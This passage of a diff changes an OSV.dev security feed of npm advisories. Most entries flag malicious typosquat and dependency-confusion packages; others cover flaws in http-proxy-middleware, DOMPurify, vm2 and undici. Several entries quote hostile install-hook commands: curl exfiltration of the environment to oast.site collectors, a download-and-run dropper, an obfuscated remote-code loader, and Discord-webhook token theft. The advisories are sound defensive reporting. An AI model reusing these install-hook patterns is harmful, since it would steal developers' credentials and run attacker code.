href="https://www.npmjs.com/package/@variational/common-ui/v/1.2.3"&gt;https://www.npmjs.com/package/@variational/common-ui/v/1.2.3&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@variational/common-ui/v/1.0.1"&gt;https://www.npmjs.com/package/@variational/common-ui/v/1.0.1&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@variational/common-ui/v/1.0.9"&gt;https://www.npmjs.com/package/@variational/common-ui/v/1.0.9&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@variational/common-ui/v/1.0.6"&gt;https://www.npmjs.com/package/@variational/common-ui/v/1.0.6&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@variational/common-ui/v/1.0.4"&gt;https://www.npmjs.com/package/@variational/common-ui/v/1.0.4&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@variational/common-ui/v/1.0.3"&gt;https://www.npmjs.com/package/@variational/common-ui/v/1.0.3&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@variational/common-ui/v/1.2.1"&gt;https://www.npmjs.com/package/@variational/common-ui/v/1.2.1&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6272"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] MAL-2026-6273: Malicious code in zod-pino (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-6273</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6273"/>
-    <published>2026-06-22T21:53:45Z</published>
-    <updated>2026-06-22T22:31:22Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in zod-pino (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;zod-pino&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
----
-_-= Per source details. Do not edit below this line.=-_
-
-## Source: amazon-inspector (94af4e18fa0fdc7c6aa17842c0dcea9d8ac7632a915cedb0d2150470d07c4e02)
-Package name typosquats the popular `pino` logger family and `zod` validation library, but the shipped code is unrelated to logging or schema validation. The tarball contains: (1) `dist/secretScan/contentScanner.js` and `dist/secretScan/agentStartupAudit.js`, which scan for secrets and post results to `https://huggingface.co` endpoints; (2) `dist/hfCredentials.js`, which decodes base64-embedded credentials (`Buffer.from(..., &amp;#x27;base64&amp;#x27;)` at line 50); (3) `dist/discordRelayUpload.js`, which performs base64 decoding and POSTs data to Discord-relay endpoints (POST calls at lines 306/321/398, base64 buffers at lines 461/536); (4) `dist/deplo…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/zod-pino/v/1.0.122"&gt;https://www.npmjs.com/package/zod-pino/v/1.0.122&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6273"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
   </entry>
   <entry>
     <title>[UPDATED] MAL-2026-5920: Malicious code in pretie_x2 (npm)</title>
@@ -655,7 +1764,7 @@ The OpenSSF Package Analysis project identified &amp;#x27;free-claude&amp;#x27; 
 It is considered malicious because:…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-7qpf-5pm7-57rh"&gt;https://github.com/advisories/GHSA-7qpf-5pm7-57rh&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6232"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
   </entry>
   <entry>
-    <title>[NEW] MAL-2026-6251: Malicious code in zomato-config (npm)</title>
+    <title>[UPDATED] MAL-2026-6251: Malicious code in zomato-config (npm)</title>
     <id>https://osv.dev/vulnerability/MAL-2026-6251</id>
     <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6251"/>
     <published>2026-06-21T16:01:08Z</published>
@@ -669,21 +1778,7 @@ _-= Per source details. Do not edit below this line.=-_
 Dependency-confusion package targeting an internal Zomato namespace. The package ships only a stub index.js (`module.exports = { name: &amp;#x27;zomato-config&amp;#x27;, version: &amp;#x27;1.0.0&amp;#x27; }`) with no real functionality. Its package.json `preinstall` lifecycle hook runs `curl` to POST `hostname`, `whoami`, `pwd`, and the full process environment (base64-encoded via `env | base64 -w0`) to `http://d8s0b82plbq3u5sb2vo0sb3a9obr4yjt7.oast.site/install/...`. This fires automatically on `npm install` and leaks any environment-variable secrets present at install time (CI tokens, cloud credentials, npm/GitHub tokens) to an attacker-controlled out-of-band interacti…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/zomato-config/v/1.0.0"&gt;https://www.npmjs.com/package/zomato-config/v/1.0.0&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6251"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
   </entry>
   <entry>
-    <title>[NEW] MAL-2026-6267: Malicious code in vitest-cli (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-6267</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6267"/>
-    <published>2026-06-22T18:23:57Z</published>
-    <updated>2026-06-22T18:31:23Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in vitest-cli (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;vitest-cli&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
----
-_-= Per source details. Do not edit below this line.=-_
-
-## Source: amazon-inspector (27abcc7f2373309feb253b0cc48b1a8bae7c54a3c43aed0c57add697f4067aba)
-Package name `vitest-cli` impersonates the official Vitest project while declaring empty `author`, `homepage`, `repository`, and `bugs` metadata. The `package.json` declares `scripts.postinstall: node scripts/postinstall.js`, which auto-runs on every `npm install`. The postinstall reaches `lib/postinstall/index.js` line 23, which evaluates a P.A.C.K.E.R.-obfuscated blob via `eval((function(p,a,c,k,e,d){...})(...))`. Once decoded, the payload calls `axios.get(&amp;#x27;https://jsonkeeper.com/external/W33XO&amp;#x27;)` and executes the response&amp;#x27;s `data.cookie` field with `new Function(&amp;#x27;require&amp;#x27;, r.data.cookie)(require)`, retrying up to three times with 10…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/vitest-cli/v/1.0.3"&gt;https://www.npmjs.com/package/vitest-cli/v/1.0.3&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/vitest-cli/v/1.0.7"&gt;https://www.npmjs.com/package/vitest-cli/v/1.0.7&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/vitest-cli/v/1.0.0"&gt;https://www.npmjs.com/package/vitest-cli/v/1.0.0&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/vitest-cli/v/1.0.9"&gt;https://www.npmjs.com/package/vitest-cli/v/1.0.9&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/vitest-cli/v/1.0.4"&gt;https://www.npmjs.com/package/vitest-cli/v/1.0.4&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6267"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] MAL-2026-6254: Malicious code in zomato-sushi (npm)</title>
+    <title>[UPDATED] MAL-2026-6254: Malicious code in zomato-sushi (npm)</title>
     <id>https://osv.dev/vulnerability/MAL-2026-6254</id>
     <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6254"/>
     <published>2026-06-21T16:11:12Z</published>
@@ -725,7 +1820,7 @@ _-= Per source details. Do not edit below this line.=-_
 package.json declares a preinstall lifecycle script: &amp;quot;curl https://poc.amanrawat.com/hehe.js -o index.js &amp;amp;&amp;amp; node index.js&amp;quot;. On every npm install, the package downloads JavaScript from poc.amanrawat.com and immediately executes it with node under the installer&amp;#x27;s privileges. The fetched content is unpinned, unhashed, served from a third-party non-publisher domain, and mutable — whoever controls poc.amanrawat.com can ship arbitrary code to every installer at any time. The package itself contains no functionality beyond this dropper. The package name (test-package-sajsdkashdj) and the fetch target (a path named hehe.js on a personal-lookin…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/test-package-sajsdkashdj/v/2.1.6"&gt;https://www.npmjs.com/package/test-package-sajsdkashdj/v/2.1.6&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/test-package-sajsdkashdj/v/2.1.7"&gt;https://www.npmjs.com/package/test-package-sajsdkashdj/v/2.1.7&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6266"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
   </entry>
   <entry>
-    <title>[NEW] MAL-2026-6253: Malicious code in zomato-server (npm)</title>
+    <title>[UPDATED] MAL-2026-6253: Malicious code in zomato-server (npm)</title>
     <id>https://osv.dev/vulnerability/MAL-2026-6253</id>
     <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6253"/>
     <published>2026-06-21T16:04:03Z</published>
@@ -753,7 +1848,7 @@ _-= Per source details. Do not edit below this line.=-_
 On `npm install`, the package&amp;#x27;s preinstall lifecycle script runs `curl` against `http://d8s0b82plbq3u5sb2vo0sb3a9obr4yjt7.oast.site/install/&amp;lt;base64(zomato-mcp)&amp;gt;` carrying the installer&amp;#x27;s `hostname -f`, `whoami`, current working directory, and a base64-encoded dump of the entire process environment (`env | base64 -w0`). This fires automatically with no user consent and over plain HTTP. A preuninstall hook similarly leaks the hostname. The `oast.site` domain is an Interactsh out-of-band collector, used to receive arbitrary attacker-controlled callbacks. The package&amp;#x27;s advertised functionality is absent: `index.js` is a 59-byte stub (`modu…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/zomato-mcp/v/1.0.0"&gt;https://www.npmjs.com/package/zomato-mcp/v/1.0.0&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6270"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
   </entry>
   <entry>
-    <title>[NEW] MAL-2026-6252: Malicious code in zomato-logger (npm)</title>
+    <title>[UPDATED] MAL-2026-6252: Malicious code in zomato-logger (npm)</title>
     <id>https://osv.dev/vulnerability/MAL-2026-6252</id>
     <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6252"/>
     <published>2026-06-21T16:11:10Z</published>
@@ -809,7 +1904,7 @@ _-= Per source details. Do not edit below this line.=-_
 package.json declares `preinstall: node index.js`, which runs automatically on `npm install`. index.js requires os, dns, https, querystring, and the local package.json, then collects installer host identifiers — homedir (os.homedir()), hostname (os.hostname()), username (os.userInfo().username), configured DNS servers (dns.getServers()), current working directory (__dirname), and the full package.json contents — and POSTs them via HTTPS to `6pwzxcku93yjz1m1mp1ctzofj6pxdn1c.oastify.com/dependency-confusion`, a Burp Collaborator (OAST) subdomain controlled by the publisher. The version number 999.0.0 combined with a generic, unscoped nam…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/gd-auth-client/v/999.0.0"&gt;https://www.npmjs.com/package/gd-auth-client/v/999.0.0&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6263"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
   </entry>
   <entry>
-    <title>[NEW] MAL-2026-6255: Malicious code in fork-angular-daterangepicker (npm)</title>
+    <title>[UPDATED] MAL-2026-6255: Malicious code in fork-angular-daterangepicker (npm)</title>
     <id>https://osv.dev/vulnerability/MAL-2026-6255</id>
     <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6255"/>
     <published>2026-06-21T17:40:39Z</published>
@@ -835,38 +1930,6 @@ _-= Per source details. Do not edit below this line.=-_
 
 ## Source: amazon-inspector (c9291507e6e48bff8b92fcd9dd1f51345077f59aae2692f3d7ca84a8c0581b04)
 search-from-feed@999.0.0 is a dependency-confusion attack package. package.json declares both `preinstall` and `postinstall` as `node callback.js`, so the payload fires automatically on every `npm install`. callback.js (lines 12-15 require https/http/os/child_process) collects the installer&amp;#x27;s username, uid/gid, homedir, hostname, cwd, local IP and external IP (queried from https://api.ipify.org), along with CI environment variables (GITHUB_TOKEN/GITHUB_REPOSITORY/GITHUB_ACTOR, GITLAB_*, JENKINS, BUILD_NUMBER, etc.), and POSTs the collected data to a hardcoded Discord webhook (`https://discord.com/api/webhooks/1516163806559076442/...`).…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/search-from-feed/v/999.0.0"&gt;https://www.npmjs.com/package/search-from-feed/v/999.0.0&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6264"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[UPDATED] GHSA-64mm-vxmg-q3vj: http-proxy-middleware `router` host+path substring matching allows Host-header-driven backend routing bypass</title>
-    <id>https://osv.dev/vulnerability/GHSA-64mm-vxmg-q3vj</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-64mm-vxmg-q3vj"/>
-    <published>2026-06-18T13:06:11Z</published>
-    <updated>2026-06-22T16:15:08Z</updated>
-    <category term="npm"/>
-    <category term="CVE-2026-55602"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;http-proxy-middleware `router` host+path substring matching allows Host-header-driven backend routing bypass&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-55602&lt;/p&gt;&lt;p&gt;Severity: CVSS_V4: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;http-proxy-middleware&lt;/code&gt; — fixed in 3.0.6&lt;/li&gt;&lt;li&gt;&lt;code&gt;http-proxy-middleware&lt;/code&gt; — fixed in 4.1.0&lt;/li&gt;&lt;li&gt;&lt;code&gt;http-proxy-middleware&lt;/code&gt; — fixed in 2.0.10&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;# Summary
-
-`http-proxy-middleware` documents `router` proxy-table entries as host, path, or host+path selectors, but the host+path implementation uses unanchored substring matching on attacker-controlled request metadata. As a result, a crafted `Host` header that is only a superstring match for a configured host+path key can still route a request to an unintended backend.
-
-# Details
-
-Tested code state:
-
-- validated on tag `v4.0.0-beta.5`
-- corresponding commit: `339f09ede860197807d4fd99ed9020fa5d0bd358`
-
-Relevant code locations:
-
-- `src/router.ts`
-- `src/http-proxy-middleware.ts`
-
-Affected public API:
-
-- `createProxyMiddleware({ router: { &amp;#x27;host/path&amp;#x27;: &amp;#x27;http://target&amp;#x27; } })`
-
-Code explanation:
-
-When a proxy-table router key contains `/`, `getTargetFromProxyTable()` concatenates attacker-cont…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/chimurai/http-proxy-middleware/security/advisories/GHSA-64mm-vxmg-q3vj"&gt;https://github.com/chimurai/http-proxy-middleware/security/advisories/GHSA-64mm-vxmg-q3vj&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/chimurai/http-proxy-middleware"&gt;https://github.com/chimurai/http-proxy-middleware&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-64mm-vxmg-q3vj"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
   </entry>
   <entry>
     <title>[UPDATED] GHSA-cmwh-pvxp-8882: DOMPurify: Permanent `ALLOWED_ATTR` pollution via `setConfig()` bypassing the hook clone-guard (incomplete fix of the 3.4.7 hook-pollution patch)</title>
@@ -960,69 +2023,5 @@ Full sandbox escape with arbitrary code execution. Attacker code inside `VM.run(
 vm2&amp;#x27;s sandbox security relies on two JavaScript-level mechanisms: (1) a code transformer that injects `handleException()` into JS `catch` clauses to wrap host-realm errors, and (2) bridge Proxies that wrap cross-context objects. Both operate entirely within JavaScript.
 
 WebAssembly&amp;#x27;s `try_table` instruction with a `JSTag` catch handler catches JavaScript exceptions at V8&amp;#x27;s C++ level — below…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/patriksimek/vm2/security/advisories/GHSA-ffh4-j6h5-pg66"&gt;https://github.com/patriksimek/vm2/security/advisories/GHSA-ffh4-j6h5-pg66&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2026-26956"&gt;https://nvd.nist.gov/vuln/detail/CVE-2026-26956&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/patriksimek/vm2"&gt;https://github.com/patriksimek/vm2&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/patriksimek/vm2/releases/tag/v3.10.5"&gt;https://github.com/patriksimek/vm2/releases/tag/v3.10.5&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-ffh4-j6h5-pg66"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[UPDATED] GHSA-35p6-xmwp-9g52: undici vulnerable to HTTP response queue poisoning via keep-alive socket reuse</title>
-    <id>https://osv.dev/vulnerability/GHSA-35p6-xmwp-9g52</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-35p6-xmwp-9g52"/>
-    <published>2026-06-19T14:19:13Z</published>
-    <updated>2026-06-21T18:29:28Z</updated>
-    <category term="npm"/>
-    <category term="CVE-2026-6733"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;undici vulnerable to HTTP response queue poisoning via keep-alive socket reuse&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-6733&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;undici&lt;/code&gt; — fixed in 6.27.0&lt;/li&gt;&lt;li&gt;&lt;code&gt;undici&lt;/code&gt; — fixed in 7.28.0&lt;/li&gt;&lt;li&gt;&lt;code&gt;undici&lt;/code&gt; — fixed in 8.5.0&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;## Impact
-
-Undici&amp;#x27;s HTTP/1.1 client is vulnerable to response queue poisoning on reused keep-alive sockets. An attacker-controlled upstream server can inject an unsolicited HTTP/1.1 response onto an idle socket after a request completes. When the client dispatches the next request on that socket, it associates the injected response with the new request, causing responses to be delivered to the wrong requests.
-
-This requires an attacker-controlled or compromised upstream HTTP/1.1 server and keep-alive connection reuse.
-
-## Patches
-
-Upgrade to undici v6.27.0, v7.28.0 or v8.5.0.
-
-## Workarounds
-
-Disable keep-alive connection reuse by setting `keepAliveTimeout: 0` on the Client or Pool.&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/nodejs/undici/security/advisories/GHSA-35p6-xmwp-9g52"&gt;https://github.com/nodejs/undici/security/advisories/GHSA-35p6-xmwp-9g52&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2026-6733"&gt;https://nvd.nist.gov/vuln/detail/CVE-2026-6733&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://hackerone.com/reports/3582376"&gt;https://hackerone.com/reports/3582376&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://cna.openjsf.org/security-advisories.html"&gt;https://cna.openjsf.org/security-advisories.html&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/nodejs/undici"&gt;https://github.com/nodejs/undici&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-35p6-xmwp-9g52"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] MAL-2026-6250: Malicious code in hyperpure-core (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-6250</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6250"/>
-    <published>2026-06-21T16:21:08Z</published>
-    <updated>2026-06-21T16:46:21Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in hyperpure-core (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;hyperpure-core&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
----
-_-= Per source details. Do not edit below this line.=-_
-
-## Source: ossf-package-analysis (1646c4910046d5c497ba97d75067f1b566f5bfe79ba938e0b9d06eda3b2eefa3)
-The OpenSSF Package Analysis project identified &amp;#x27;hyperpure-core&amp;#x27; @ 1.0.0 (npm) as malicious.
-
-It is considered malicious because:
-
-- The package communicates with a domain associated with malicious activity.
-
-- The package executes one or more commands associated with malicious behavior.
-&lt;/p&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6250"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] MAL-2026-6249: Malicious code in blinkit-core (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-6249</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6249"/>
-    <published>2026-06-21T16:21:08Z</published>
-    <updated>2026-06-21T16:46:20Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in blinkit-core (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;blinkit-core&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
----
-_-= Per source details. Do not edit below this line.=-_
-
-## Source: ossf-package-analysis (304234c334dce7d26c040f318d608e24b53db9b0b7b0b27d3a6dd2c040481b15)
-The OpenSSF Package Analysis project identified &amp;#x27;blinkit-core&amp;#x27; @ 1.0.0 (npm) as malicious.
-
-It is considered malicious because:
-
-- The package communicates with a domain associated with malicious activity.
-
-- The package executes one or more commands associated with malicious behavior.
-&lt;/p&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6249"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
   </entry>
 </feed>
